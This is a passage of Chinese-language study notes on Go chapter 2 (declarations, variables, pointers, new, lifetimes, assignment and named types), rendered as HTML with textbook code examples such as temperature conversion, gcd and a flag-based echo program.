100°C\n}\n</code></pre></div><p>其中常量boilingF是在包一级范围声明语句声明的，然后f和c两个变量是在main函数内部声明的声明语句声明的。在包一级声明语句声明的名字可在整个包对应的每个源文件中访问，而不是仅仅在其声明语句所在的源文件中访问。相比之下，局部声明的名字就只能在函数内部很小的范围被访问。</p>\n<h3>函数声明</h3>\n<ul>\n<li>一个函数的声明由一个函数名字、参数列表（由函数的调用者提供参数变量的具体值）、一个可选的返回值列表和包含函数定义的函数体组成。</li>\n<li>如果函数没有返回值，那么返回值列表是省略的。</li>\n<li>执行函数从函数的第一个语句开始，依次顺序执行直到遇到return返回语句，如果没有返回语句则是执行到函数末尾，然后返回到函数调用者。</li>\n</ul>\n<p>在这个例子中，main函数就调用了两次fToC函数，分别使用在局部定义的两个常量作为调用函数的参数。</p>\n<p><em>gopl.io/ch2/ftoc</em></p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>// Ftoc prints two Fahrenheit-to-Celsius conversions.\npackage main\n\nimport \"fmt\"\n\nfunc main() {\n    const freezingF, boilingF = 32.0, 212.0\n    fmt.Printf(\"%g°F = %g°C\\n\", freezingF, fToC(freezingF)) // \"32°F = 0°C\"\n    fmt.Printf(\"%g°F = %g°C\\n\", boilingF, fToC(boilingF))   // \"212°F = 100°C\"\n}\n\nfunc fToC(f float64) float64 {\n    return (f - 32) * 5 / 9\n}\n</code></pre></div><h2>2.3. 变量</h2>\n<h3>var声明语句</h3>\n<p>var声明语句可以创建一个特定类型的变量，然后给变量附加一个名字，并且设置变量的初始值。变量声明的一般语法如下：</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>var 变量名字 类型 = 表达式\n</code></pre></div><p>其中 <code>类型</code>或 <code>= 表达式</code>两个部分可以省略其中的一个。</p>\n<ul>\n<li>如果省略的是类型信息，那么将根据初始化表达式来推导变量的类型信息。</li>\n<li>如果初始化表达式被省略，那么将用零值初始化该变量。</li>\n</ul>\n<h3>零值</h3>\n<p>数值类型变量对应的零值是0，布尔类型变量对应的零值是false，字符串类型对应的零值是空字符串，接口或引用类型（包括slice、指针、map、chan和函数）变量对应的零值是nil。数组或结构体等聚合类型对应的零值是每个元素或字段都是对应该类型的零值。</p>\n<p>零值初始化机制可以确保每个声明的变量总是有一个良好定义的值，因此在Go语言中不存在未初始化的变量。这个特性可以简化很多代码，而且可以在没有增加额外工作的前提下确保边界条件下的合理行为。例如：</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>var s string\nfmt.Println(s) // \"\"\n</code></pre></div><p>这段代码将打印一个空字符串，而不是导致错误或产生不可预知的行为。Go语言程序员应该让一些聚合类型的零值也具有意义，这样可以保证不管任何类型的变量总是有一个合理有效的零值状态。</p>\n<p>也可以在一个声明语句中同时声明一组变量，或用一组初始化表达式声明并初始化一组变量。如果省略每个变量的类型，将可以声明多个类型不同的变量（类型由初始化表达式推导）：</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>var i, j, k int                 // int, int, int\nvar b, f, s = true, 2.3, \"four\" // bool, float64, string\n</code></pre></div><p>初始化表达式可以是字面量或任意的表达式。</p>\n<p>在包级别声明的变量会在main入口函数执行前完成初始化（§2.6.2），局部变量将在声明语句被执行到的时候完成初始化。</p>\n<p>一组变量也可以通过调用一个函数，由函数返回的多个返回值初始化：</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>var f, err = os.Open(name) // os.Open returns a file and an error\n</code></pre></div><h3>2.3.1. 简短变量声明</h3>\n<p>在函数内部，有一种称为简短变量声明语句的形式可用于声明和初始化局部变量。它以 <code>名字 := 表达式</code>形式声明变量，变量的类型根据表达式来自动推导。下面是lissajous函数中的三个简短变量声明语句（§1.4）：</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>anim := gif.GIF{LoopCount: nframes}\nfreq := rand.Float64() * 3.0\nt := 0.0\n</code></pre></div><p>因为简洁和灵活的特点，简短变量声明被广泛用于大部分的局部变量的声明和初始化。</p>\n<p>var形式的声明语句往往是用于需要显式指定变量类型的地方，或者因为变量稍后会被重新赋值而初始值无关紧要的地方。</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>i := 100                  // an int\nvar boiling float64 = 100 // a float64\nvar names []string\nvar err error\nvar p Point\n</code></pre></div><p>和var形式声明语句一样，简短变量声明语句也可以用来声明和初始化一组变量：</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>i, j := 0, 1\n</code></pre></div><p>但是这种同时声明多个变量的方式应该限制只在可以提高代码可读性的地方使用，比如for语句的循环的初始化语句部分。</p>\n<blockquote>\n<p>请记住 <code>:=</code>是一个变量声明语句，而 <code>=</code>是一个变量赋值操作。</p>\n<p>也不要混淆多个变量的声明和元组的多重赋值（§2.4.1），后者是将右边各个表达式的值赋值给左边对应位置的各个变量：</p>\n</blockquote>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>i, j = j, i // 交换 i 和 j 的值\n</code></pre></div><p>和普通var形式的变量声明语句一样，简短变量声明语句也可以用函数的返回值来声明和初始化变量，像下面的os.Open函数调用将返回两个值：</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>f, err := os.Open(name)\nif err != nil {\n    return err\n}\n// ...use f...\nf.Close()\n</code></pre></div><p>这里有一个比较微妙的地方：简短变量声明左边的变量可能并不是全部都是刚刚声明的。</p>\n<blockquote>\n<p>如果有一些已经在相同的词法域声明过了（§2.7），那么简短变量声明语句对这些已经声明过的变量就只有赋值行为了。</p>\n</blockquote>\n<p>在下面的代码中，第一个语句声明了in和err两个变量。在第二个语句只声明了out一个变量，然后对已经声明的err进行了赋值操作。</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>in, err := os.Open(infile)\n// ...\nout, err := os.Create(outfile)\n</code></pre></div><blockquote>\n<p>简短变量声明语句中必须至少要声明一个新的变量</p>\n</blockquote>\n<p>下面的代码将不能编译通过：</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>f, err := os.Open(infile)\n// ...\nf, err := os.Create(outfile) // compile error: no new variables\n</code></pre></div><p>解决的方法是第二个简短变量声明语句改用普通的多重赋值语句。</p>\n<blockquote>\n<p>简短变量声明语句只有对已经在同级词法域声明过的变量才和赋值操作语句等价，如果变量是在外部词法域声明的，那么简短变量声明语句将会在当前词法域重新声明一个新的变量。</p>\n</blockquote>\n<h3>2.3.2. 指针</h3>\n<p>一个变量对应一个保存了变量对应类型值的内存空间。一个指针的值是另一个变量的地址，一个指针对应变量在内存中的存储位置。并不是每一个值都会有一个内存地址，但是对于每一个变量必然有对应的内存地址。通过指针，我们可以直接读或更新对应变量的值，而不需要知道该变量的名字（如果变量有名字的话）。</p>\n<ul>\n<li>如果用 <code>var x int</code>声明语句声明一个x变量，那么 <code>&amp;x</code>表达式（取x变量的内存地址）将产生一个指向该整数变量的指针，指针对应的数据类型是 <code>*int</code>，指针被称之为“指向int类型的指针”。</li>\n<li>如果指针名字为p，那么可以说“p指针指向变量x”，或者说“p指针保存了x变量的内存地址”。</li>\n<li><code>*p</code>表达式对应p指针指向的变量的值。一般 <code>*p</code>表达式读取指针指向的变量的值，这里为int类型</li>\n<li>因为 <code>*p</code>对应一个变量，所以该表达式也可以出现在赋值语句的左边，表示更新指针所指向的变量的值。</li>\n</ul>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>x := 1\np := &amp;x         // p, of type *int, points to x\nfmt.Println(*p) // \"1\"\n*p = 2          // equivalent to x = 2\nfmt.Println(x)  // \"2\"\n</code></pre></div><p>对于聚合类型每个成员（比如结构体的每个字段）、或者是数组的每个元素，都是<strong>对应一个变量，因此可以被取地址。</strong></p>\n<p><strong>变量有时候被称为可寻址的值</strong>。即使变量由表达式临时生成，那么表达式也必须能接受 <code>&amp;</code>取地址操作。</p>\n<p>任何类型的指针的零值都是nil。如果p指向某个有效变量，那么 <code>p != nil</code>测试为真。指针之间也是可以进行相等测试的，只有当它们指向同一个变量或全部是nil时才相等。</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>var x, y int\nfmt.Println(&amp;x == &amp;x, &amp;x == &amp;y, &amp;x == nil) // \"true false false\"\n</code></pre></div><p>在Go语言中，返回函数中局部变量的地址也是安全的。例如下面的代码，调用f函数时创建局部变量v，在局部变量地址被返回之后依然有效，因为指针p依然引用这个变量。</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>var p = f()\n\nfunc f() *int {\n    v := 1\n    return &amp;v\n}\n</code></pre></div><p>每次调用f函数都将返回不同的结果：</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>fmt.Println(f() == f()) // \"false\"\n</code></pre></div><figure><figcaption>image-20240320220720825</figcaption></figure>\n<p>因为指针包含了一个变量的地址，因此如果将指针作为参数调用函数，那将可以在函数中通过该指针来更新变量的值。例如下面</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>func incr(p *int) int {\n    *p++ // 非常重要：只是增加p指向的变量的值，并不改变p指针！！！\n    return *p\n}\n\nv := 1\nincr(&amp;v)              // side effect: v is now 2\nfmt.Println(incr(&amp;v)) // \"3\" (and v is 3)\n</code></pre></div><figure><figcaption>image-20240323122637144</figcaption></figure>\n<p>每次我们对一个变量取地址，或者复制指针，我们都是为原变量创建了新的别名。例如，<code>*p</code>就是变量v的别名。</p>\n<p>指针特别有价值的地方在于我们可以不用名字而访问一个变量，但是这是一把双刃剑：要找到一个变量的所有访问者并不容易，我们必须知道变量全部的别名（译注：这是Go语言的垃圾回收器所做的工作）。</p>\n<p>不仅仅是指针会创建别名，很多其他引用类型也会创建别名，例如slice、map和chan，甚至结构体、数组和接口都会创建所引用变量的别名。</p>\n<p>指针是实现标准库中flag包的关键技术，它使用命令行参数来设置对应变量的值，而这些对应命令行标志参数的变量可能会零散分布在整个程序中。为了说明这一点，在早些的echo版本中，就包含了两个可选的命令行参数：<code>-n</code>用于忽略行尾的换行符，<code>-s sep</code>用于指定分隔字符（默认是空格）。</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token comment\">// Echo4 prints its command-line arguments.</span>\n<span class=\"token keyword\">package</span> main\n\n<span class=\"token keyword\">import</span> <span class=\"token punctuation\">(</span>\n    <span class=\"token string\">\"flag\"</span>\n    <span class=\"token string\">\"fmt\"</span>\n    <span class=\"token string\">\"strings\"</span>\n<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">var</span> n <span class=\"token operator\">=</span> flag<span class=\"token punctuation\">.</span><span class=\"token function\">Bool</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"n\"</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"omit trailing newline\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">var</span> sep <span class=\"token operator\">=</span> flag<span class=\"token punctuation\">.</span><span class=\"token function\">String</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"s\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\" \"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"separator\"</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    flag<span class=\"token punctuation\">.</span><span class=\"token function\">Parse</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Print</span><span class=\"token punctuation\">(</span>strings<span class=\"token punctuation\">.</span><span class=\"token function\">Join</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">.</span><span class=\"token function\">Args</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span>sep<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">if</span> <span class=\"token operator\">!</span><span class=\"token operator\">*</span>n <span class=\"token punctuation\">{</span>\n        fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n</code></pre></div><p>调用 <code>flag.Bool</code>函数会创建一个新的对应布尔型标志参数的变量。它有三个属性：第一个是命令行标志参数的名字“n”，然后是该标志参数的默认值（这里是false），最后是该标志参数对应的描述信息。如果用户在命令行输入了一个无效的标志参数，或者输入 <code>-h</code>或 <code>-help</code>参数，那么将打印所有标志参数的名字、默认值和描述信息。</p>\n<p>调用 <code>flag.String</code>函数将创建一个对应字符串类型的标志参数变量，同样包含命令行标志参数对应的参数名、默认值、和描述信息。程序中的 <code>sep</code>和 <code>n</code>变量分别是指向对应命令行标志参数变量的指针，因此必须用 <code>*sep</code>和 <code>*n</code>形式的指针语法间接引用它们。</p>\n<p>当程序运行时，必须在使用标志参数对应的变量之前先调用 <code>flag.Parse</code>函数，用于更新每个标志参数对应变量的值（之前是默认值）。对于非标志参数的普通命令行参数可以通过调用 <code>flag.Args()</code>函数来访问，返回值对应一个字符串类型的slice。如果在flag.Parse函数解析命令行参数时遇到错误，默认将打印相关的提示信息，然后调用os.Exit(2)终止程序。</p>\n<figure><figcaption>image-20240323124302842</figcaption></figure>\n<h3>2.3.3. new函数</h3>\n<p>另一个创建变量的方法是调用内建的 <code>new</code>函数。表达式 <code>new(T)</code>将创建一个 <code>T</code>类型的匿名变量，初始化为 <code>T</code>类型的零值，然后返回变量地址，返回的指针类型为 <code>*T</code>。</p>\n<p>用new创建变量和普通变量声明语句方式创建变量没有什么区别，除了不需要声明一个临时变量的名字外，我们还可以在表达式中使用new(T)。</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code>p <span class=\"token operator\">:=</span> <span class=\"token function\">new</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span>   <span class=\"token comment\">// p, *int 类型, 指向匿名的 int 变量</span>\nfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>p<span class=\"token punctuation\">)</span> <span class=\"token comment\">// \"0\"</span>\n<span class=\"token operator\">*</span>p <span class=\"token operator\">=</span> <span class=\"token number\">2</span>          <span class=\"token comment\">// 设置 int 匿名变量的值为 2</span>\nfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>p<span class=\"token punctuation\">)</span> <span class=\"token comment\">// \"2\"</span>\n</code></pre></div><p>下面的两个newInt函数有着相同的行为：</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>func newInt() *int {\n    return new(int)\n}\n\nfunc newInt() *int {\n    var dummy int\n    return &amp;dummy\n}\n</code></pre></div><p>每次调用new函数都是返回一个新的变量的地址，因此下面两个地址是不同的：</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>p := new(int)\nq := new(int)\nfmt.Println(p == q) // \"false\"\n</code></pre></div><p>当然也可能有特殊情况：如果两个类型都是空的，也就是说类型的大小是0，例如 <code>struct{}</code>和 <code>[0]int</code>，有可能有相同的地址（依赖具体的语言实现）</p>\n<p>new函数使用通常相对比较少，因为对于结构体来说，直接用字面量语法创建新变量的方法会更灵活（§4.4.1）。</p>\n<p>由于new只是一个预定义的函数，它并不是一个关键字，因此我们可以将new名字重新定义为别的类型。例如下面的例子：</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>func delta(old, new int) int { return new - old }\n</code></pre></div><p>由于new被定义为int类型的变量名，因此在delta函数内部是无法使用内置的new函数的。</p>\n<h3>2.3.4. 变量的生命周期</h3>\n<ul>\n<li>对于在包一级声明的变量来说，它们的生命周期和整个程序的运行周期是一致的。</li>\n<li>局部变量的生命周期则是动态的：每次从创建一个新变量的声明语句开始，直到该变量不再被引用为止，然后变量的存储空间可能被回收。函数的参数变量和返回值变量都是局部变量。它们在函数每次被调用的时候创建。</li>\n</ul>\n<p>那么Go语言的自动垃圾收集器是如何知道一个变量是何时可以被回收的呢？基本的实现思路是：</p>\n<ul>\n<li>从每个包级的变量和每个当前运行函数的每一个局部变量开始，通过指针或引用的访问路径遍历，是否可以找到该变量。如果不存在这样的访问路径，那么说明该变量是不可达的，也就是说它是否存在并不会影响程序后续的计算结果。</li>\n<li>因为一个变量的有效周期只取决于是否可达，因此一个循环迭代内部的局部变量的生命周期可能超出其局部作用域。同时，局部变量可能在函数返回之后依然存在。</li>\n</ul>\n<p>编译器会自动选择在栈上还是在堆上分配局部变量的存储空间：</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>var global *int\n\nfunc f() {\n    var x int\n    x = 1\n    global = &amp;x\n}\n\nfunc g() {\n    y := new(int)\n    *y = 1\n}\n</code></pre></div><ul>\n<li>f函数里的x变量必须在堆上分配，因为它在函数退出后依然可以通过包一级的global变量找到，虽然它是在函数内部定义的；用Go语言的术语说，这个x局部变量从函数f中逃逸了。</li>\n<li>相反，当g函数返回时，变量 <code>*y</code>将是不可达的，也就是说可以马上被回收的。因此，<code>*y</code>并没有从函数g中逃逸，编译器可以选择在栈上分配 <code>*y</code>的存储空间（译注：也可以选择在堆上分配，然后由Go语言的GC回收这个变量的内存空间），虽然这里用的是new方式。</li>\n<li>要记住的是，逃逸的变量需要额外分配内存，同时对性能的优化可能会产生细微的影响。</li>\n</ul>\n<h2>2.4. 赋值</h2>\n<p>使用赋值语句可以更新一个变量的值，最简单的赋值语句是将要被赋值的变量放在=的左边，新值的表达式放在=的右边。</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>x = 1                       // 命名变量的赋值\n*p = true                   // 通过指针间接赋值\nperson.name = \"bob\"         // 结构体字段赋值\ncount[x] = count[x] * scale // 数组、slice或map的元素赋值\n</code></pre></div><p>特定的二元算术运算符和赋值语句的复合操作有一个简洁形式，例如上面最后的语句可以重写为：</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>count[x] *= scale\n</code></pre></div><p>这样可以省去对变量表达式的重复计算。</p>\n<p>数值变量也可以支持 <code>++</code>递增和 <code>--</code>递减语句（译注：自增和自减是语句，而不是表达式，因此 <code>x = i++</code>之类的表达式是错误的）：</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>v := 1\nv++    // 等价方式 v = v + 1；v 变成 2\nv--    // 等价方式 v = v - 1；v 变成 1\n</code></pre></div><h3>2.4.1. 元组赋值</h3>\n<p>元组赋值是另一种形式的赋值语句，它允许同时更新多个变量的值。在赋值之前，赋值语句右边的所有表达式将会先进行求值，然后再统一更新左边对应变量的值。这对于处理有些同时出现在元组赋值语句左右两边的变量很有帮助，例如我们可以这样交换两个变量的值：</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>x, y = y, x\n\na[i], a[j] = a[j], a[i]\n</code></pre></div><p>或者是计算两个整数值的的最大公约数（GCD）（译注：GCD不是那个敏感字，而是greatest common divisor的缩写，欧几里德的GCD是最早的非平凡算法）：</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>func gcd(x, y int) int {\n    for y != 0 {\n        x, y = y, x%y\n    }\n    return x\n}\n</code></pre></div><p>或者是计算斐波纳契数列（Fibonacci）的第N个数：</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>func fib(n int) int {\n    x, y := 0, 1\n    for i := 0; i &lt; n; i++ {\n        x, y = y, x+y\n    }\n    return x\n}\n</code></pre></div><p>元组赋值也可以使一系列琐碎赋值更加紧凑（译注: 特别是在for循环的初始化部分），</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>i, j, k = 2, 3, 5\n</code></pre></div><p>但如果表达式太复杂的话，应该尽量避免过度使用元组赋值；因为每个变量单独赋值语句的写法可读性会更好。</p>\n<h4>多个返回值</h4>\n<p>有些表达式会产生多个值，比如调用一个有多个返回值的函数。当这样一个函数调用出现在元组赋值右边的表达式中时（译注：右边不能再有其它表达式），左边变量的数目必须和右边一致。</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>f, err = os.Open(\"foo.txt\") // function call returns two values\n</code></pre></div><p>通常，这类函数会用额外的返回值来表达某种错误类型，例如os.Open是用额外的返回值返回一个error类型的错误，还有一些是用来返回布尔值，通常被称为ok。在稍后我们将看到的三个操作都是类似的用法。如果map查找（§4.3）、类型断言（§7.10）或通道接收（§8.4.2）出现在赋值语句的右边，它们都可能会产生两个结果，有一个额外的布尔结果表示操作是否成功：</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>v, ok = m[key]             // map lookup\nv, ok = x.(T)              // type assertion\nv, ok = &lt;-ch               // channel receive\n</code></pre></div><p>译注：map查找（§4.3）、类型断言（§7.10）或通道接收（§8.4.2）出现在赋值语句的右边时，并不一定是产生两个结果，也可能只产生一个结果。对于只产生一个结果的情形，map查找失败时会返回零值，类型断言失败时会发生运行时panic异常，通道接收失败时会返回零值（阻塞不算是失败）。例如下面的例子：</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>v = m[key]                // map查找，失败时返回零值\nv = x.(T)                 // type断言，失败时panic异常\nv = &lt;-ch                  // 管道接收，失败时返回零值（阻塞不算是失败）\n\n_, ok = m[key]            // map返回2个值\n_, ok = mm[\"\"], false     // map返回1个值\n_ = mm[\"\"]                // map返回1个值\n</code></pre></div><p>和变量声明一样，我们可以用下划线空白标识符 <code>_</code>来丢弃不需要的值。</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>_, err = io.Copy(dst, src) // 丢弃字节数\n_, ok = x.(T)              // 只检测类型，忽略具体值\n</code></pre></div><h3>2.4.2. 可赋值性</h3>\n<p>隐式的赋值：</p>\n<ul>\n<li>函数调用会隐式地将调用参数的值赋值给函数的参数变量</li>\n<li>一个返回语句会隐式地将返回操作的值赋值给结果变量</li>\n<li>一个复合类型的字面量（§4.2）也会产生赋值行为。例如下面的语句：</li>\n</ul>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>medals := []string{\"gold\", \"silver\", \"bronze\"}\n</code></pre></div><p>隐式地对slice的每个元素进行赋值操作，类似这样写的行为：</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>medals[0] = \"gold\"\nmedals[1] = \"silver\"\nmedals[2] = \"bronze\"\n</code></pre></div><p>map和chan的元素，虽然不是普通的变量，但是也有类似的隐式赋值行为。</p>\n<p>不管是隐式还是显式地赋值，在赋值语句左边的变量和右边最终的值必须有相同的数据类型。更直白地说，只有右边的值对于左边的变量是可赋值的，赋值语句才是允许的。</p>\n<p>除一些特殊情况外，可赋值的规则：类型必须完全匹配，nil可以赋值给任何指针或引用类型的变量。常量（§3.6）则有更灵活的赋值规则，因为这样可以避免不必要的显式的类型转换。</p>\n<p>对于任何类型的值的相等比较（==<code>或</code>!=），第二个值必须是对第一个值类型对应的变量是可赋值的，反之亦然。</p>\n<h2>2.5. 类型</h2>\n<p>一个类型声明语句创建了一个新的类型名称，和现有类型具有相同的底层结构。新命名的类型提供了一个方法，用来分隔不同概念的类型，这样即使它们底层类型相同也是不兼容的。</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>type 类型名字 底层类型\n</code></pre></div><p>类型声明语句一般出现在包一级，因此如果新创建的类型名字的首字符大写，则在包外部也可以使用。</p>\n<p>我们将不同温度单位分别定义为不同的类型：</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>// Package tempconv performs Celsius and Fahrenheit temperature computations.\npackage tempconv\n\nimport \"fmt\"\n\ntype Celsius float64    // 摄氏温度\ntype Fahrenheit float64 // 华氏温度\n\nconst (\n    AbsoluteZeroC Celsius = -273.15 // 绝对零度\n    FreezingC     Celsius = 0       // 结冰点温度\n    BoilingC      Celsius = 100     // 沸水温度\n)\n\nfunc CToF(c Celsius) Fahrenheit { return Fahrenheit(c*9/5 + 32) }\n\nfunc FToC(f Fahrenheit) Celsius { return Celsius((f - 32) * 5 / 9) }\n</code></pre></div><p>我们在这个包声明了两种类型：Celsius和Fahrenheit分别对应不同的温度单位。它们虽然有着相同的底层类型float64，但是它们是不同的数据类型，因此它们不可以被相互比较或混在一个表达式运算。</p>\n<p>Celsius(t)和Fahrenheit(t)是类型转换操作，它们并不是函数调用。类型转换不会改变值本身，但是会使它们的语义发生变化。另一方面，CToF和FToC两个函数则是对不同温度单位下的温度进行换算，它们会返回不同的值。</p>\n<p>对于每一个类型T，都有一个对应的类型转换操作 <code>T(x)</code>，用于将x转为T类型（译注：如果T是指针类型，可能会需要用小括弧包装T，比如 <code>(*int)(0)</code>）。只有当两个类型的底层基础类型相同时，才允许这种转型操作，或者是两者都是指向相同底层结构的指针类型，这些转换只改变类型而不会影响值本身。</p>\n<p>数值类型之间的转型也是允许的，并且在字符串和一些特定类型的slice之间也是可以转换的，在下一章我们会看到这样的例子。这类转换可能改变值的表现。例如，将一个浮点数转为整数将丢弃小数部分，将一个字符串转为 <code>[]byte</code>类型的slice将拷贝一个字符串数据的副本。在任何情况下，运行时不会发生转换失败的错误（译注: 错误只会发生在编译阶段）。</p>\n<p>底层数据类型决定了内部结构和表达方式，也决定是否可以像底层类型一样对内置运算符的支持。这意味着，Celsius和Fahrenheit类型的算术运算行为和底层的float64类型是一样的，正如我们所期望的那样。</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>fmt.Printf(\"%g\\n\", BoilingC-FreezingC) // \"100\" °C\nboilingF := CToF(BoilingC)\nfmt.Printf(\"%g\\n\", boilingF-CToF(FreezingC)) // \"180\" °F\nfmt.Printf(\"%g\\n\", boilingF-FreezingC)       // compile error: type mismatch\n</code></pre></div><figure><figcaption>image-20240323175325426</figcaption></figure>\n<p>比较运算符 <code>==</code>和 <code>&lt;</code>也可以用来比较一个命名类型的变量和另一个有相同类型的变量，或有着相同底层类型的未命名类型的值之间做比较。但是如果两个值有着不同的类型，则不能直接进行比较：</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>var c Celsius\nvar f Fahrenheit\nfmt.Println(c == 0)          // \"true\"\nfmt.Println(f &gt;= 0)          // \"true\"\nfmt.Println(c == f)          // compile error: type mismatch\nfmt.Println(c == Celsius(f)) // \"true\"!\n</code></pre></div><p>注意最后那个语句。尽管看起来像函数调用，但是Celsius(f)是类型转换操作，它并不会改变值，仅仅是改变值的类型而已。测试为真的原因是因为c和f都是零值。</p>\n<figure><figcaption>image-20240323180618198</figcaption></figure>\n<p>命名类型还可以为该类型的值定义新的行为。这些行为表示为一组关联到该类型的函数集合，我们称为类型的方法集。</p>\n<p>下面的声明语句，Celsius类型的参数c出现在了函数名的前面，表示声明的是Celsius类型的一个名叫String的方法，该方法返回该类型对象c带着°C温度单位的字符串：</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>func (c Celsius) String() string { return fmt.Sprintf(\"%g°C\", c) }\n</code></pre></div><p>许多类型都会定义一个String方法，因为当使用fmt包的打印方法时，将会优先使用该类型对应的String方法返回的结果打印，我们将在7.1节讲述。</p>\n<div class=\"language-Go\" data-ext=\"Go\" data-title=\"Go\"><pre class=\"language-Go\"><code>c := FToC(212.0)\nfmt.Println(c.String()) // \"100°C\"\nfmt.Printf(\"%v\\n\", c)   // \"100°C\"; no need to call String explicitly\nfmt.Printf(\"%s\\n\", c)   // \"100°C\"\nfmt.Println(c)          // \"100°C\"\nfmt.Printf(\"%g\\n\", c)   // \"100\"; does not call String\nfmt.Println(float64(c)) // \"100\"; does not call String\n</code></pre></div><figure><figcaption>image-20240323180830536</figcaption></figure>\n<h2>2.6. 包和文件</h2>\n<p>Go语言中的包和其他语言的库或模块的概念类似，目的都是为了支持模块化、封装、单独编译和代码重用。一个包的源代码保存在一个或多个以.go为文件后缀名的源文件中，通常一个包所在目录路径的后缀是包的导入路径；例如包 <code>gopl.io/ch1/helloworld</code>对应的目录路径是 <code>$GOPATH/src/gopl.io/ch1/helloworld</code>。</p>\n<p>每个包都对应一个独立的名字空间。例如，在image包中的Decode函数和在unicode/utf16包中的 